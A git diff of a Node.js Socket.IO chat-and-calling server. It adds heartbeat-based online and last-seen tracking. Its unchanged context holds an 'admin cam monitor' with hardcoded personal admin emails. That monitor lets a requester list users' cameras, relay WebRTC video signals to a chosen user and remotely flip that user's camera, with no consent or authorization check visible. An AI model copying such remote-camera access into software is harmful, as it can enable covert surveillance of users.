@@ -25,8 +25,12 @@ const io = new Server(httpServer, {
 
 // Track online users: identifier -> Set of socket IDs (multiple tabs)
 const onlineUsers = new Map(); // email or userId -> Set<socketId>
+
+// Track per-socket heartbeat timestamp for crash detection
+const heartbeatMap = new Map(); // socketId -> { userId, email, timestamp }
+
 // Track which socket is in an active call
-const activeCalls = new Set(); // socketIds currently in a call
+const activeCalls = new Set();
 
 // Helper: get all socket IDs for a target room
 function getRoomSockets(target) {
@@ -34,11 +38,52 @@ function getRoomSockets(target) {
   return io.sockets.adapter.rooms.get(target) || new Set();
 }
 
-// Helper: broadcast updated online users list to everyone
+// Helper: broadcast full online users list to everyone
 function broadcastOnlineUsers() {
   const onlineList = Array.from(onlineUsers.keys());
   io.emit('online_users', onlineList);
 }
+
+// Broadcast activity update to all connected sockets
+// This replaces the old user_last_seen + online_users combo
+function broadcastActivityUpdate(userId, email, isOnline, lastSeen) {
+  io.emit('activity_update', {
+    userId,
+    email: email ? email.toLowerCase().trim() : undefined,
+    isOnline,
+    lastSeen: lastSeen || new Date().toISOString()
+  });
+}
+
+// ─── 60-SECOND SWEEP: detect stale heartbeats (crash/network loss) ──────────
+setInterval(() => {
+  const now = Date.now();
+  const STALE_THRESHOLD_MS = 60 * 1000; // 60 seconds
+
+  for (const [socketId, data] of heartbeatMap.entries()) {
+    const staleness = now - data.timestamp;
+    if (staleness > STALE_THRESHOLD_MS) {
+      // Socket is stale — mark as offline
+      const { userId, email } = data;
+
+      // Clean from onlineUsers
+      [email, userId].filter(Boolean).forEach(key => {
+        const sockets = onlineUsers.get(key);
+        if (sockets) {
+          sockets.delete(socketId);
+          if (sockets.size === 0) onlineUsers.delete(key);
+        }
+      });
+
+      heartbeatMap.delete(socketId);
+
+      // Broadcast offline with the last known heartbeat time as lastSeen
+      const lastSeen = new Date(data.timestamp).toISOString();
+      broadcastActivityUpdate(userId, email, false, lastSeen);
+      console.log(`[SWEEP] Marked stale socket ${socketId} offline (user: ${email || userId})`);
+    }
+  }
+}, 60 * 1000);
 
 io.on('connection', (socket) => {
   console.log('Socket connected:', socket.id);
@@ -48,6 +93,8 @@ io.on('connection', (socket) => {
 
   // ─── IDENTIFY ────────────────────────────────────────────────────────────────
   socket.on('identify', ({ email, userId, username }) => {
+    let changed = false;
+
     if (email) {
       const emailRoom = email.toLowerCase().trim();
       socket.join(emailRoom);
@@ -56,6 +103,7 @@ io.on('connection', (socket) => {
       socket.camUsername = username || emailRoom.split('@')[0];
       if (!onlineUsers.has(emailRoom)) {
         onlineUsers.set(emailRoom, new Set());
+        changed = true;
       }
       onlineUsers.get(emailRoom).add(socket.id);
     }
@@ -66,25 +114,48 @@ io.on('connection', (socket) => {
       socket.userId = idRoom;
       if (!onlineUsers.has(idRoom)) {
         onlineUsers.set(idRoom, new Set());
+        changed = true;
       }
       onlineUsers.get(idRoom).add(socket.id);
     }
 
+    // Track heartbeat for this socket
+    heartbeatMap.set(socket.id, {
+      userId: socket.userId,
+      email: socket.userEmail,
+      timestamp: Date.now()
+    });
+
+    // Broadcast online status update to all
+    if (changed || socket.justConnected) {
+      broadcastActivityUpdate(socket.userId, socket.userEmail, true, new Date().toISOString());
+    }
+    socket.justConnected = false;
+
     broadcastOnlineUsers();
     console.log(`User identified: ${socket.userEmail || ''} / ${socket.userId || ''} (${socket.id})`);
+  });
+
+  // ─── HEARTBEAT ───────────────────────────────────────────────────────────────
+  socket.on('heartbeat', ({ userId, email }) => {
+    // Update heartbeat timestamp — lightweight, no DB write needed here
+    // The DB is updated by the client's periodic POST to /api/user/activity
+    heartbeatMap.set(socket.id, {
+      userId: socket.userId || userId,
+      email: socket.userEmail || (email ? email.toLowerCase().trim() : undefined),
+      timestamp: Date.now()
+    });
   });
 
   // ─── MESSAGING ───────────────────────────────────────────────────────────────
   socket.on('send_social_message', (data) => {
     const { receiverEmail, receiverId, ...msgData } = data;
     
-    // Avoid double emissions if receiver socket is in both email & userId rooms
     const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
     if (targetRoom) {
       socket.to(targetRoom).emit('receive_social_message', msgData);
     }
 
-    // Echo to sender's other tabs
     const senderRoom = socket.userEmail || socket.userId;
     if (senderRoom) {
       socket.to(senderRoom).emit('receive_social_message', msgData);
@@ -122,7 +193,6 @@ io.on('connection', (socket) => {
       socket.to(String(receiverId).trim()).emit('receive_nickname', nicknameData);
     }
   });
-
 
   // ─── FOLLOW / REQUEST EVENTS ──────────────────────────────────────────────────
   socket.on('social_request_event', (data) => {
@@ -165,7 +235,6 @@ io.on('connection', (socket) => {
 
   // ─── CALL EVENTS ─────────────────────────────────────────────────────────────
 
-  // Caller initiates a call
   socket.on('call_user', (data) => {
     const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
     const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
@@ -182,16 +251,12 @@ io.on('connection', (socket) => {
       return;
     }
 
-    const payload = {
-      from: data.from,
-      type: data.type
-    };
+    const payload = { from: data.from, type: data.type };
 
     if (targetEmail) socket.to(targetEmail).emit('incoming_call', payload);
     if (targetUserId) socket.to(targetUserId).emit('incoming_call', payload);
   });
 
-  // Receiver accepts the call
   socket.on('accept_call', (data) => {
     const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
     const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
@@ -208,7 +273,6 @@ io.on('connection', (socket) => {
     if (targetUserId) socket.to(targetUserId).emit('call_accepted', payload);
   });
 
-  // Receiver rejects the call
   socket.on('reject_call', (data) => {
     const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
     const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
@@ -218,7 +282,6 @@ io.on('connection', (socket) => {
     if (targetUserId) socket.to(targetUserId).emit('call_rejected', payload);
   });
 
-  // Either party ends the call
   socket.on('end_call', (data) => {
     const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
     const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
@@ -234,7 +297,6 @@ io.on('connection', (socket) => {
     if (targetUserId) socket.to(targetUserId).emit('call_ended');
   });
 
-  // WebRTC Signaling relay (SDP offers/answers + ICE candidates)
   socket.on('webrtc_signal', (data) => {
     const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
     const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
@@ -266,10 +328,9 @@ io.on('connection', (socket) => {
     }
   });
 
-  // ─── ADMIN CAM MONITOR (Fresh, Stable WebRTC Signaling) ─────────────────────
+  // ─── ADMIN CAM MONITOR ─────────────────────────────────────────────────────
   const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
 
-  // User registers camera presence
   socket.on('cam_user_online', ({ email, username }) => {
     socket.camEmail = email ? email.toLowerCase().trim() : null;
     socket.camUsername = username || email;
@@ -282,7 +343,6 @@ io.on('connection', (socket) => {
     });
   });
 
-  // Admin requests list of active cam clients
   socket.on('cam_get_users', () => {
     const userMap = new Map();
     for (const [, s] of io.sockets.sockets) {
@@ -298,11 +358,9 @@ io.on('connection', (socket) => {
     socket.emit('cam_users_list', Array.from(userMap.values()));
   });
 
-  // Unified WebRTC signal relay (Offer, Answer, ICE Candidate)
   socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
     let targetSocket = targetSocketId ? io.sockets.sockets.get(targetSocketId) : null;
     
-    // Fallback: search explicitly by email
     if (!targetSocket && targetEmail) {
       const cleanEmail = targetEmail.toLowerCase().trim();
       for (const [, s] of io.sockets.sockets) {
@@ -321,7 +379,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Admin requests target client to flip between front and back camera
   socket.on('cam_flip_camera', ({ targetSocketId, targetEmail }) => {
     let targetSocket = targetSocketId ? io.sockets.sockets.get(targetSocketId) : null;
     if (!targetSocket && targetEmail) {
@@ -339,12 +396,11 @@ io.on('connection', (socket) => {
   });
 
   // ─── DISCONNECT ──────────────────────────────────────────────────────────────
-
   socket.on('disconnect', () => {
     console.log('Socket disconnected:', socket.id);
 
-    // Remove from active calls
     activeCalls.delete(socket.id);
+    heartbeatMap.delete(socket.id);
 
     // Notify admins that this cam user went offline
     if (socket.camEmail || socket.userEmail) {
@@ -355,7 +411,7 @@ io.on('connection', (socket) => {
 
     // Remove from online tracking
     const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
-    let changed = false;
+    let wentOffline = false;
 
     roomsToClean.forEach(room => {
       const sockets = onlineUsers.get(room);
@@ -363,17 +419,19 @@ io.on('connection', (socket) => {
         sockets.delete(socket.id);
         if (sockets.size === 0) {
           onlineUsers.delete(room);
-          changed = true;
-          io.emit('user_last_seen', {
-            email: socket.userEmail,
-            userId: socket.userId,
-            lastSeen: new Date().toISOString()
-          });
+          wentOffline = true;
         }
       }
     });
 
-    if (changed) {
+    if (wentOffline) {
+      // Broadcast immediate offline with current time as lastSeen
+      broadcastActivityUpdate(
+        socket.userId,
+        socket.userEmail,
+        false,
+        new Date().toISOString()
+      );
       broadcastOnlineUsers();
     }
   });
